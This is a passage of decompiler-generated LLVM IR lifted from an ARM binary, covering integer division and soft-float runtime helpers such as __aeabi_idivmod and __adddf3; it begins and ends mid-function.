  br i1 %v4_211c8, label %bb88, label %dec_label_pc_211d8thread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_211cc = and i32 %v0_211d8.pr40, 268435456
  %v3_211cc = icmp eq i32 %v2_211cc, 0
  %v4_211cc = mul i32 %v0_211d8.pr40, 16
  br i1 %v3_211cc, label %bb89, label %dec_label_pc_211d8.loopexit

bb89:                                             ; preds = %bb88
  %v2_211d0 = and i32 %v1_211d0, 268435456
  %v3_211d0 = icmp eq i32 %v2_211d0, 0
  %v4_211d0 = mul i32 %v1_211d0, 16
  br i1 %v3_211d0, label %.preheader, label %dec_label_pc_211d8thread-pre-split.loopexit.loopexit

dec_label_pc_211d8thread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_211e452.ph = phi i32 [ %v1_211d0, %bb87 ], [ %v4_211d0, %bb89 ]
  %v0_211d8.pr42.ph = phi i32 [ %v0_211d8.pr40, %bb87 ], [ %v4_211cc, %bb89 ]
  br label %dec_label_pc_211d8thread-pre-split.loopexit

dec_label_pc_211d8thread-pre-split.loopexit:      ; preds = %dec_label_pc_211d8thread-pre-split.loopexit.loopexit, %.thread3
  %v1_211e452 = phi i32 [ %v1_211d0, %.thread3 ], [ %v1_211e452.ph, %dec_label_pc_211d8thread-pre-split.loopexit.loopexit ]
  %v0_211d8.pr42 = phi i32 [ %v0_211d8.pr40, %.thread3 ], [ %v0_211d8.pr42.ph, %dec_label_pc_211d8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_211d8thread-pre-split

dec_label_pc_211d8thread-pre-split:               ; preds = %dec_label_pc_211d8thread-pre-split.loopexit, %bb91
  %v1_211e450 = phi i32 [ %v1_211e452, %dec_label_pc_211d8thread-pre-split.loopexit ], [ %v3_211e4, %bb91 ]
  %v2_211dc48 = phi i32 [ %v0_21290, %dec_label_pc_211d8thread-pre-split.loopexit ], [ %v2_211dc, %bb91 ]
  %v0_211d8.pr = phi i32 [ %v0_211d8.pr42, %dec_label_pc_211d8thread-pre-split.loopexit ], [ %v3_211e0, %bb91 ]
  br label %dec_label_pc_211d8

dec_label_pc_211d8.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_211d8

dec_label_pc_211d8:                               ; preds = %dec_label_pc_211d8.loopexit, %dec_label_pc_211d8thread-pre-split
  %v1_211e4 = phi i32 [ %v1_211e450, %dec_label_pc_211d8thread-pre-split ], [ %v1_211d0, %dec_label_pc_211d8.loopexit ]
  %v2_211dc = phi i32 [ %v2_211dc48, %dec_label_pc_211d8thread-pre-split ], [ %v0_21290, %dec_label_pc_211d8.loopexit ]
  %v1_211e0 = phi i32 [ %v0_211d8.pr, %dec_label_pc_211d8thread-pre-split ], [ %v4_211cc, %dec_label_pc_211d8.loopexit ]
  %v2_211d8 = icmp slt i32 %v1_211e0, 0
  br i1 %v2_211d8, label %dec_label_pc_211ec, label %bb90

bb90:                                             ; preds = %dec_label_pc_211d8
  %v4_211dc = icmp ult i32 %v1_211e0, %v2_211dc
  br i1 %v4_211dc, label %bb91, label %dec_label_pc_211ec

bb91:                                             ; preds = %bb90
  %v3_211e0 = mul i32 %v1_211e0, 2
  %v2_211e4 = icmp slt i32 %v1_211e4, 0
  %v3_211e4 = mul i32 %v1_211e4, 2
  br i1 %v2_211e4, label %dec_label_pc_211ec, label %dec_label_pc_211d8thread-pre-split

dec_label_pc_211ec:                               ; preds = %bb90, %dec_label_pc_211d8, %bb91
  %v2_211f863 = phi i32 [ %v3_211e4, %bb91 ], [ %v1_211e4, %bb90 ], [ %v1_211e4, %dec_label_pc_211d8 ]
  %v1_211f055 = phi i32 [ %v3_211e0, %bb91 ], [ %v1_211e0, %bb90 ], [ %v1_211e0, %dec_label_pc_211d8 ]
  br label %dec_label_pc_211f0

dec_label_pc_211f0:                               ; preds = %.thread13, %dec_label_pc_211ec
  %v1_21224 = phi i32 [ %v4_21224, %.thread13 ], [ %v2_211f863, %dec_label_pc_211ec ]
  %v1_211f8 = phi i32 [ %v1_21234, %.thread13 ], [ 0, %dec_label_pc_211ec ]
  %v1_21228 = phi i32 [ %v4_21228, %.thread13 ], [ %v1_211f055, %dec_label_pc_211ec ]
  %v1_211f4 = phi i32 [ %v0_21220, %.thread13 ], [ %v0_21290, %dec_label_pc_211ec ]
  %v3_211f0 = icmp ult i32 %v1_211f4, %v1_21228
  br i1 %v3_211f0, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_211f0
  %v3_211f4 = sub i32 %v1_211f4, %v1_21228
  %v3_211f8 = or i32 %v1_211f8, %v1_21224
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_211f0, %bb92
  %v1_21200 = phi i32 [ %v1_211f4, %dec_label_pc_211f0 ], [ %v3_211f4, %bb92 ]
  %v1_21204 = phi i32 [ %v1_211f8, %dec_label_pc_211f0 ], [ %v3_211f8, %bb92 ]
  %v4_211fc = udiv i32 %v1_21228, 2
  %v6_211fc = icmp ult i32 %v1_21200, %v4_211fc
  br i1 %v6_211fc, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_21200 = urem i32 %v1_21228, 2
  %v4_21200 = icmp eq i32 %v3_21200, 0
  %v6_21200 = sub i32 %v1_21200, %v4_211fc
  br i1 %v4_21200, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_21204 = udiv i32 %v1_21224, 2
  %v6_21204 = or i32 %v1_21204, %v5_21204
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_2120c = phi i32 [ %v6_21200, %bb93 ], [ %v1_21200, %.thread8 ], [ %v6_21200, %bb94 ]
  %v1_21210 = phi i32 [ %v1_21204, %bb93 ], [ %v1_21204, %.thread8 ], [ %v6_21204, %bb94 ]
  %v4_21208 = udiv i32 %v1_21228, 4
  %v6_21208 = icmp ult i32 %v1_2120c, %v4_21208
  br i1 %v6_21208, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_2120c = and i32 %v1_21228, 2
  %v4_2120c = icmp eq i32 %v3_2120c, 0
  %v6_2120c = sub i32 %v1_2120c, %v4_21208
  br i1 %v4_2120c, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_21210 = udiv i32 %v1_21224, 4
  %v6_21210 = or i32 %v1_21210, %v5_21210
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_21218 = phi i32 [ %v6_2120c, %bb95 ], [ %v1_2120c, %.thread9 ], [ %v6_2120c, %bb96 ]
  %v1_2121c = phi i32 [ %v1_21210, %bb95 ], [ %v1_21210, %.thread9 ], [ %v6_21210, %bb96 ]
  %v4_21214 = udiv i32 %v1_21228, 8
  %v6_21214 = icmp ult i32 %v1_21218, %v4_21214
  br i1 %v6_21214, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_21218 = and i32 %v1_21228, 4
  %v4_21218 = icmp eq i32 %v3_21218, 0
  %v6_21218 = sub i32 %v1_21218, %v4_21214
  br i1 %v4_21218, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_2121c = udiv i32 %v1_21224, 8
  %v6_2121c = or i32 %v1_2121c, %v5_2121c
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_21234 = phi i32 [ %v1_2121c, %bb97 ], [ %v1_2121c, %.thread10 ], [ %v6_2121c, %bb98 ]
  %v0_21220 = phi i32 [ %v6_21218, %bb97 ], [ %v1_21218, %.thread10 ], [ %v6_21218, %bb98 ]
  %v2_21220 = icmp eq i32 %v0_21220, 0
  br i1 %v2_21220, label %dec_label_pc_21230, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_21224, 16
  br i1 %tmp, label %dec_label_pc_21230, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_21224 = udiv i32 %v1_21224, 16
  %v4_21228 = udiv i32 %v1_21228, 16
  br label %dec_label_pc_211f0

dec_label_pc_21230:                               ; preds = %thread-pre-split12, %bb99
  %v1_21230 = icmp slt i32 %v2_21188, 0
  br i1 %v1_21230, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_21230
  %v2_21234 = sub i32 0, %v1_21234
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_2123c, %dec_label_pc_21230, %bb100
  %v1_21238 = phi i32 [ %v1_21234, %dec_label_pc_21230 ], [ %v2_21234, %bb100 ], [ %arg1, %dec_label_pc_2123c ], [ %v2_21240, %bb101 ], [ %v1_2125480, %bb103 ], [ %v2_21250, %bb104 ]
  ret i32 %v1_21238

dec_label_pc_2123c:                               ; preds = %thread-pre-split
  br i1 %v1_21184, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_2123c
  %v2_21240 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_21248:                               ; preds = %bb86
  br i1 %v3_211a4, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_21248
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_21248, %bb102
  %v1_2125480 = phi i32 [ %arg1, %dec_label_pc_21248 ], [ 0, %bb102 ]
  br i1 %v9_211a4, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_2124c = ashr i32 %v2_21188, 31
  %v2_21250 = or i32 %v4_2124c, 1
  br label %.thread16

dec_label_pc_21258:                               ; preds = %dec_label_pc_211ac
  %v2_21258 = icmp ugt i32 %v1_2125c, 65535
  br i1 %v2_21258, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_21258
  %v2_2125c = and i32 %v1_2125c, 32768
  %v3_2125c = icmp eq i32 %v2_2125c, 0
  %v4_2125c = udiv i32 %v1_2125c, 65536
  br i1 %v3_2125c, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_21258
  %v0_2126870 = phi i32 [ %v1_2125c, %dec_label_pc_21258 ], [ %v4_2125c, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_2126c = phi i32 [ %v0_2126870, %.thread19 ], [ %v4_2125c, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_21268 = icmp ugt i32 %v1_2126c, 255
  br i1 %v2_21268, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_2126c = and i32 %v1_2126c, 128
  %v3_2126c = icmp eq i32 %v2_2126c, 0
  %v4_2126c = udiv i32 %v1_2126c, 256
  br i1 %v3_2126c, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_21270 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_2127c = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_21270, %bb108 ]
  %v1_21278 = phi i32 [ %v1_2126c, %bb106 ], [ %v4_2126c, %bb107 ], [ %v4_2126c, %bb108 ]
  %v2_21274 = icmp ugt i32 %v1_21278, 15
  br i1 %v2_21274, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_21278 = and i32 %v1_21278, 8
  %v3_21278 = icmp eq i32 %v2_21278, 0
  %v4_21278 = udiv i32 %v1_21278, 16
  br i1 %v3_21278, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_2127c = add nsw i32 %v1_2127c, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_21284 = phi i32 [ %v1_2127c, %.thread20 ], [ %v1_2127c, %bb109 ], [ %v2_2127c, %bb110 ]
  %v5_21288 = phi i32 [ %v1_21278, %.thread20 ], [ %v4_21278, %bb109 ], [ %v4_21278, %bb110 ]
  %v2_21280 = icmp ugt i32 %v5_21288, 3
  %v7_21280 = icmp eq i32 %v5_21288, 4
  %v2_21284 = xor i1 %v7_21280, true
  %v3_21284 = and i1 %v2_21280, %v2_21284
  br i1 %v3_21284, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_21284 = add nsw i32 %v4_21284, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_21288 = phi i32 [ %v4_21284, %.thread21 ], [ %v5_21284, %bb111 ]
  %v2_21288 = xor i1 %v2_21280, true
  %v3_21288 = or i1 %v7_21280, %v2_21288
  br i1 %v3_21288, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_21288 = udiv i32 %v5_21288, 2
  %v9_21288 = add i32 %v4_21288, %v8_21288
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_21290 = phi i32 [ %v4_21288, %bb112 ], [ %v9_21288, %bb113 ]
  %v1_2128c = icmp slt i32 %v2_21188, 0
  %v6_21290 = lshr i32 %v0_21290, %v1_21290
  %v2_21294 = sub i32 0, %v6_21290
  %v2_21294.v6_21290 = select i1 %v1_2128c, i32 %v2_21294, i32 %v6_21290
  ret i32 %v2_21294.v6_21290

dec_label_pc_2129c:                               ; preds = %entry
  %v0_212a0 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_21288, { 1, 0 }
  uselistorder i1 %v7_21280, { 1, 0 }
  uselistorder i32 %v4_21278, { 1, 0 }
  uselistorder i32 %v1_21278, { 1, 0, 2, 3 }
  uselistorder i32 %v4_2126c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_2126c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_2125c, { 1, 0 }
  uselistorder i32 %v0_21220, { 1, 0 }
  uselistorder i32 %v4_21214, { 1, 0 }
  uselistorder i32 %v1_2121c, { 1, 2, 0 }
  uselistorder i32 %v4_21208, { 1, 0 }
  uselistorder i32 %v1_21210, { 1, 2, 0 }
  uselistorder i32 %v4_211fc, { 1, 0 }
  uselistorder i32 %v1_21204, { 1, 2, 0 }
  uselistorder i32 %v1_21228, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_211f8, { 1, 0 }
  uselistorder i32 %v1_21224, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_211e4, { 1, 0 }
  uselistorder i32 %v3_211e0, { 1, 0 }
  uselistorder i32 %v1_211e0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_211dc, { 1, 0 }
  uselistorder i32 %v1_211e4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_211d0, { 1, 0 }
  uselistorder i32 %v4_211cc, { 2, 1, 0 }
  uselistorder i32 %v1_211d0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_211d8.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_211a4, { 1, 0 }
  uselistorder i32 %v1_2125c, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_21188, { 1, 0, 2 }
  uselistorder i32 %v0_21184, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_21230, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_211ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_211d8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_212b4 = sdiv i32 %arg1, %arg2
  ret i32 %v2_212b4
}

define i32 @__aeabi_drsub(double %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = sext i32 %arg3 to i64
  %v8_212cc = bitcast i64 %tmp to double
  %v9_212cc = fadd double %v8_212cc, %arg1
  %v10_212cc = fptrunc double %v9_212cc to float
  %v11_212cc = bitcast float %v10_212cc to i32
  ret i32 %v11_212cc
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_212d0 = load i32, i32* @r0, align 4
  ret i32 %v2_212d0
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_212d4 = load i32, i32* @r4, align 4
  store i32 %v3_212d4, i32* %stack_var_-12, align 4
  %v6_212d4 = load i32, i32* @r5, align 4
  %v9_212d4 = load i32, i32* @lr, align 4
  %v0_212d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_212d8 = mul i32 %v0_212d8, 2
  store i32 %v2_212d8, i32* %r4.global-to-local, align 4
  %v0_212dc = load i32, i32* %r3.global-to-local, align 4
  %v2_212dc = mul i32 %v0_212dc, 2
  store i32 %v2_212dc, i32* %r5.global-to-local, align 4
  %v4_212e0 = icmp eq i32 %v2_212dc, %v2_212d8
  %v1_212e4 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v4_212e0, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_212e4 = load i32, i32* %r2.global-to-local, align 4
  %v5_212e4 = icmp eq i32 %v2_212e4, %v1_212e4
  br i1 %v5_212e4, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_212e8 = or i32 %v1_212e4, %v2_212d8
  %v5_212e8 = icmp eq i32 %v3_212e8, 0
  br i1 %v5_212e8, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_212ec = load i32, i32* %r2.global-to-local, align 4
  %v3_212ec = or i32 %v2_212ec, %v2_212dc
  %v5_212ec = icmp eq i32 %v3_212ec, 0
  br i1 %v5_212ec, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_212d8.off = add i32 %v2_212d8, 4194303
  %tmp = icmp ult i32 %v2_212d8.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_212dc.off = add i32 %v2_212dc, 4194303
  %tmp17 = icmp ult i32 %v2_212dc.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_212f8 = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_212f8, i32 ptrtoint (i32* @global_var_21530.1895 to i32))
  %v0_212fc = load i32, i32* %r4.global-to-local, align 4
  %v3_212fc = udiv i32 %v0_212fc, 2097152
  store i32 %v3_212fc, i32* %r4.global-to-local, align 4
  %v1_21300 = load i32, i32* %r5.global-to-local, align 4
  %v4_21300 = udiv i32 %v1_21300, 2097152
  %v5_21300 = sub nsw i32 %v4_21300, %v3_212fc
  %v5_21304 = icmp ult i32 %v4_21300, %v3_212fc
  br i1 %v5_21304, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_21304 = sub nsw i32 0, %v5_21300
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_21304, %bb13 ], [ %v5_21300, %.thread3 ]
  %v0_21328 = phi i32 [ %v7_21304, %bb13 ], [ %v5_21300, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_21308 = icmp ugt i32 %v4_21300, %v3_212fc
  br i1 %v7_21308, label %dec_label_pc_2130c, label %dec_label_pc_21328

dec_label_pc_2130c:                               ; preds = %bb14
  %v2_2130c = add nsw i32 %v0_21328, %v3_212fc
  store i32 %v2_2130c, i32* %r4.global-to-local, align 4
  %v0_21310 = load i32, i32* %r0.global-to-local, align 4
  %v1_21310 = load i32, i32* %r2.global-to-local, align 4
  %v0_21314 = load i32, i32* %r1.global-to-local, align 4
  %v1_21314 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_21310, i32* %r0.global-to-local, align 4
  store i32 %v1_21314, i32* %r1.global-to-local, align 4
  store i32 %v0_21310, i32* %r2.global-to-local, align 4
  store i32 %v0_21314, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_21328

dec_label_pc_21328:                               ; preds = %bb14, %dec_label_pc_2130c
  %tmp18 = icmp ugt i32 %v0_21328, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_21328
  %v6_2132c = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_2132c, i32* %r4.global-to-local, align 4
  store i32 %v6_212d4, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_21328, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_212d4)
  %v0_21334 = load i32, i32* %r1.global-to-local, align 4
  %v3_21334 = icmp sgt i32 %v0_21334, -1
  %v4_21340 = urem i32 %v0_21334, 1048576
  %v5_21340 = or i32 %v4_21340, 1048576
  store i32 %v5_21340, i32* %r1.global-to-local, align 4
  br i1 %v3_21334, label %dec_label_pc_21350, label %dec_label_pc_21348

dec_label_pc_21348:                               ; preds = %bb16
  %v0_21348 = load i32, i32* %r0.global-to-local, align 4
  %v1_21348 = sub i32 0, %v0_21348
  store i32 %v1_21348, i32* %r0.global-to-local, align 4
  %v2_21348 = icmp eq i32 %v0_21348, 0
  %v2_2134c = icmp eq i1 %v2_21348, false
  %v5_2134c = sext i1 %v2_2134c to i32
  %v6_2134c = sub nsw i32 %v5_2134c, %v5_21340
  store i32 %v6_2134c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_21350

dec_label_pc_21350:                               ; preds = %bb16, %dec_label_pc_21348
  %v0_21350 = load i32, i32* %r3.global-to-local, align 4
  %v3_21350 = icmp sgt i32 %v0_21350, -1
  %v4_21358 = urem i32 %v0_21350, 1048576
  %v5_21358 = or i32 %v4_21358, 1048576
  store i32 %v5_21358, i32* %r3.global-to-local, align 4
  br i1 %v3_21350, label %dec_label_pc_21368, label %dec_label_pc_21360

dec_label_pc_21360:                               ; preds = %dec_label_pc_21350
  %v0_21360 = load i32, i32* %r2.global-to-local, align 4
  %v1_21360 = sub i32 0, %v0_21360
  store i32 %v1_21360, i32* %r2.global-to-local, align 4
  %v2_21360 = icmp eq i32 %v0_21360, 0
  %v2_21364 = icmp eq i1 %v2_21360, false
  %v5_21364 = sext i1 %v2_21364 to i32
  %v6_21364 = sub nsw i32 %v5_21364, %v5_21358
  store i32 %v6_21364, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_21368

dec_label_pc_21368:                               ; preds = %dec_label_pc_21350, %dec_label_pc_21360
  %v0_21368 = load i32, i32* %r4.global-to-local, align 4
  %v1_21368 = load i32, i32* %r5.global-to-local, align 4
  %v4_21368 = icmp eq i32 %v1_21368, %v0_21368
  call void @__pseudo_cond_branch(i1 %v4_21368, i32 ptrtoint (i32* @global_var_21518.1896 to i32))
  %v1_2136c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_2136c

; uselistorder directives
  uselistorder i32 %v0_21350, { 1, 0 }
  uselistorder i32 %v0_21334, { 1, 0 }
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_21300, { 2, 1, 0 }
  uselistorder i32 %v3_212fc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_212e4, { 1, 0 }
  uselistorder i32 %v2_212dc, { 1, 3, 0, 2 }
  uselistorder i32 %v2_212d8, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 6, 0, 1, 2 }
  uselistorder label %dec_label_pc_21368, { 1, 0 }
  uselistorder label %dec_label_pc_21350, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_21328, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_21370() local_unnamed_addr {
dec_label_pc_21370:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_21370 = load i32, i32* @r4, align 4
  %v1_21370 = add i32 %v0_21370, -1
  store i32 %v1_21370, i32* @r4, align 4
  %v0_21374 = load i32, i32* @r5, align 4
  %v1_21374 = sub i32 32, %v0_21374
  store i32 %v1_21374, i32* @lr, align 4
  %v5_21378 = icmp sgt i32 %v0_21374, 32
  br i1 %v5_21378, label %dec_label_pc_21394, label %dec_label_pc_2137c

dec_label_pc_2137c:                               ; preds = %dec_label_pc_21370
  %v0_2137c = load i32, i32* @r2, align 4
  %v6_2137c = shl i32 %v0_2137c, %v1_21374
  store i32 %v6_2137c, i32* %ip.global-to-local, align 4
  %v0_21380 = load i32, i32* @r0, align 4
  %v3_21380 = add i32 %v0_21374, -1
  %v4_21380 = shl i32 1, %v3_21380
  %v7_21380 = lshr i32 %v0_2137c, %v0_21374
  %v8_21380 = add i32 %v0_21380, %v7_21380
  %v9_21380 = icmp ult i32 %v8_21380, %v0_21380
  %v0_21384 = load i32, i32* @r1, align 4
  %v2_21384 = zext i1 %v9_21380 to i32
  %v3_21384 = add i32 %v2_21384, %v0_21384
  %v1_21388 = load i32, i32* @r3, align 4
  %v7_21388 = shl i32 %v1_21388, %v1_21374
  %v8_21388 = add i32 %v7_21388, %v8_21380
  store i32 %v8_21388, i32* %r0.global-to-local, align 4
  %v5_2138c = and i32 %v1_21388, %v4_21380
  %v6_2138c = icmp ne i32 %v5_2138c, 0
  %v7_2138c = ashr i32 %v1_21388, %v0_21374
  %v9_2138c = add i32 %v3_21384, %v7_2138c
  %v10_2138c = zext i1 %v6_2138c to i32
  %v11_2138c = add i32 %v10_2138c, %v9_2138c
  br label %dec_label_pc_213b0

dec_label_pc_21394:                               ; preds = %dec_label_pc_21370
  %v1_21394 = add i32 %v0_21374, -32
  %v1_21398 = add i32 %v1_21374, 32
  store i32 %v1_21398, i32* @lr, align 4
  %v0_213a0 = load i32, i32* @r3, align 4
  %v2_213a0 = add i32 %v1_21374, 31
  %v3_213a0 = lshr i32 -2147483648, %v2_213a0
  %v4_213a0 = and i32 %v0_213a0, %v3_213a0
  %v5_213a0 = icmp ne i32 %v4_213a0, 0
  %v6_213a0 = shl i32 %v0_213a0, %v1_21398
  %v2_213a4 = or i32 %v6_213a0, 2
  %v2_213a4.v6_213a0 = select i1 %v5_213a0, i32 %v2_213a4, i32 %v6_213a0
  store i32 %v2_213a4.v6_213a0, i32* %ip.global-to-local, align 4
  %v0_213a8 = load i32, i32* @r0, align 4
  %v7_213a8 = ashr i32 %v0_213a0, %v1_21394
  %v8_213a8 = add i32 %v0_213a8, %v7_213a8
  store i32 %v8_213a8, i32* %r0.global-to-local, align 4
  %v0_213ac = load i32, i32* @r1, align 4
  %v2_213ac = and i32 %v0_213a0, 1073741824
  %v3_213ac = icmp ne i32 %v2_213ac, 0
  %v4_213ac = ashr i32 %v0_213a0, 31
  %v6_213ac = add i32 %v0_213ac, %v4_213ac
  %v7_213ac = zext i1 %v3_213ac to i32
  %v8_213ac = add i32 %v6_213ac, %v7_213ac
  br label %dec_label_pc_213b0

dec_label_pc_213b0:                               ; preds = %dec_label_pc_2137c, %dec_label_pc_21394
  %storemerge = phi i32 [ %v11_2138c, %dec_label_pc_2137c ], [ %v8_213ac, %dec_label_pc_21394 ]
  %v0_213b0 = phi i32 [ %v11_2138c, %dec_label_pc_2137c ], [ %v8_213ac, %dec_label_pc_21394 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_213b0 = and i32 %v0_213b0, -2147483648
  store i32 %v1_213b0, i32* @r5, align 4
  %v1_213b4 = icmp sgt i32 %v0_213b0, -1
  call void @__pseudo_cond_branch(i1 %v1_213b4, i32 ptrtoint (i32* @global_var_213c4.1897 to i32))
  %v0_213b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_213b8 = sub i32 0, %v0_213b8
  store i32 %v1_213b8, i32* %ip.global-to-local, align 4
  %v2_213b8 = icmp eq i32 %v0_213b8, 0
  %v0_213bc = load i32, i32* %r0.global-to-local, align 4
  %v2_213bc = icmp eq i1 %v2_213b8, false
  %v5_213bc = sext i1 %v2_213bc to i32
  %v6_213bc = sub i32 %v5_213bc, %v0_213bc
  store i32 %v6_213bc, i32* %r0.global-to-local, align 4
  %v7_213bc = zext i1 %v2_213bc to i32
